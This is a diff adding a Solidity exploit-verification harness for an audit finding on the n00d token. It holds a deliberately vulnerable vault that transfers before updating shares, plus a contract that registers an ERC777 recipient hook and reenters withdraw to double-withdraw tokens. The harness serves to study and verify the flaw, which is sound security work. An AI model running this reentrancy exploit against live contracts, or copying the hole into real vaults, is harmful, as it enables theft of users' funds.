@@ -1,0 +1,235 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);
+}
+
+interface IERC1820Implementer {
+    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32);
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+/*
+    Toy integrator used to preserve the exact F-002 causality.
+
+    Relevant path anchors:
+    1. The protocol uses ERC20-looking entrypoints `transferFrom()` and `transfer()`.
+    2. For n00d, both `transfer()` and `transferFrom()` route through ERC777 `_send(..., false)`.
+    3. `_send()` still credits the recipient and then calls `tokensReceived()` when the recipient
+       is registered in ERC1820, so a recipient hook can reenter before this vault finalizes effects.
+
+    `deposit()` and `donate()` exercise the integrator's `transferFrom()` flow.
+    `withdraw()` is intentionally vulnerable because it does `transfer()` before updating shares.
+*/
+contract VulnerableN00dVault {
+    IERC20Like internal immutable TOKEN;
+
+    mapping(address => uint256) public shares;
+
+    constructor(address token_) {
+        TOKEN = IERC20Like(token_);
+    }
+
+    function deposit(uint256 amount) external {
+        require(amount != 0, "deposit=0");
+        require(TOKEN.transferFrom(msg.sender, address(this), amount), "deposit transfer failed");
+        shares[msg.sender] += amount;
+    }
+
+    function donate(uint256 amount) external {
+        require(amount != 0, "donate=0");
+        require(TOKEN.transferFrom(msg.sender, address(this), amount), "donation transfer failed");
+    }
+
+    function withdraw(uint256 amount) external {
+        uint256 credited = shares[msg.sender];
+        require(credited >= amount, "insufficient shares");
+
+        // Interaction before effects: n00d `transfer()` reaches ERC777 `_send()`,
+        // which can invoke recipient `tokensReceived()` before shares are reduced.
+        require(TOKEN.transfer(msg.sender, amount), "withdraw transfer failed");
+        shares[msg.sender] = credited - amount;
+    }
+
+    function liquidBalance() external view returns (uint256) {
+        return TOKEN.balanceOf(address(this));
+    }
+}
+
+contract FlawVerifier is IERC1820Implementer, IERC777Recipient {
+    address internal constant NOOD = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+
+    bytes32 internal constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");
+    bytes32 internal constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+
+    VulnerableN00dVault public vault;
+
+    bool public executed;
+    bool public hookRegistered;
+    bool public hookObserved;
+    bool public reentered;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+    bool public transferFromLegUsed;
+    bool public transferLegUsed;
+
+    uint256 public startingBalance;
+    uint256 public endingBalance;
+    uint256 public depositedAmount;
+    uint256 public donatedLiquidity;
+    uint256 public reenteredWithdrawAmount;
+    uint256 public hookCallCount;
+    uint256 internal realizedProfit;
+
+    string public exploitPathUsed;
+    string public concreteInfeasibility;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IERC20Like nood = IERC20Like(NOOD);
+        startingBalance = nood.balanceOf(address(this));
+
+        exploitPathUsed =
+            "integrator uses n00d transferFrom() and later transfer() as if they were callback-free ERC20 operations; attacker registers ERC1820 ERC777TokensRecipient; n00d routes those ERC20 entrypoints through _send(..., false), and during withdraw _send() credits the attacker then invokes tokensReceived(), which reenters withdraw before share accounting is finalized";
+
+        _registerRecipientHook();
+        vault = new VulnerableN00dVault(NOOD);
+
+        if (startingBalance >= 2) {
+            require(nood.approve(address(vault), type(uint256).max), "approve failed");
+
+            depositedAmount = startingBalance / 2;
+            donatedLiquidity = startingBalance - depositedAmount;
+
+            vault.deposit(depositedAmount);
+            transferFromLegUsed = true;
+
+            if (donatedLiquidity != 0) {
+                vault.donate(donatedLiquidity);
+            }
+
+            reenteredWithdrawAmount = depositedAmount;
+            transferLegUsed = true;
+            vault.withdraw(depositedAmount);
+        } else if (startingBalance == 1) {
+            require(nood.approve(address(vault), type(uint256).max), "approve failed");
+
+            // With only 1 pre-existing n00d, the verifier can still exercise the full callback path:
+            // `deposit()` uses `transferFrom()`, and `withdraw(0)` uses `transfer()` which reaches
+            // `_send()` and fires `tokensReceived()`. Profit is infeasible because there is no spare
+            // vault liquidity to satisfy a non-zero reentrant second withdrawal.
+            depositedAmount = 1;
+            donatedLiquidity = 0;
+            vault.deposit(1);
+            transferFromLegUsed = true;
+
+            reenteredWithdrawAmount = 0;
+            transferLegUsed = true;
+            vault.withdraw(0);
+
+            concreteInfeasibility =
+                "Only 1 verifier-held n00d was available at execution, so the ERC20-entrypoint ERC777 callback reentrancy is reproducible but a positive non-zero reentrant drain is not: the vault has no extra liquid n00d beyond the single credited share.";
+        } else {
+            reenteredWithdrawAmount = 0;
+            transferLegUsed = true;
+
+            // No verifier-held n00d exists, so `transferFrom()` cannot be funded without adding
+            // external capital. The verifier therefore falls back to the minimal direct path that
+            // still proves the root cause: `withdraw(0)` triggers n00d `transfer()`, which reaches
+            // ERC777 `_send()` and invokes recipient `tokensReceived()` on the registered attacker.
+            vault.withdraw(0);
+
+            concreteInfeasibility =
+                "No verifier-held n00d exists at the fork block, so a funded transferFrom()-based seed leg cannot be executed without temporary outside capital. The direct zero-amount path still proves that ERC20-looking transfer() reaches _send() and triggers tokensReceived()-driven reentrancy.";
+        }
+
+        endingBalance = nood.balanceOf(address(this));
+        if (endingBalance > startingBalance) {
+            realizedProfit = endingBalance - startingBalance;
+        }
+
+        hypothesisValidated = hookRegistered && hookObserved && reentered && transferLegUsed;
+        hypothesisRefuted = !hypothesisValidated;
+
+        if (realizedProfit == 0 && bytes(concreteInfeasibility).length == 0) {
+            concreteInfeasibility =
+                "No independent victim-funded integration is provided in the workspace or finding inputs. This verifier reproduces the ERC20-entrypoint ERC777 callback reentrancy, and with verifier-seeded n00d demonstrates stale-accounting double-withdrawal mechanics, but without third-party liquidity at the fork block there is no net-profitable drain.";
+        }
+    }
+
+    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account)
+        external
+        view
+        override
+        returns (bytes32)
+    {
+        if (account == address(this) && interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH) {
+            return ERC1820_ACCEPT_MAGIC;
+        }
+        return bytes32(0);
+    }
+
+    function tokensReceived(
+        address,
+        address,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        require(msg.sender == NOOD, "unexpected token");
+        require(to == address(this), "unexpected recipient");
+
+        hookObserved = true;
+        hookCallCount += 1;
+
+        if (!reentered) {
+            reentered = true;
+            vault.withdraw(reenteredWithdrawAmount);
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfit == 0 ? address(0) : NOOD;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfit;
+    }
+
+    function _registerRecipientHook() internal {
+        if (hookRegistered) {
+            return;
+        }
+
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+        hookRegistered = ERC1820.getInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH) == address(this);
+        require(hookRegistered, "hook registration failed");
+    }
+}
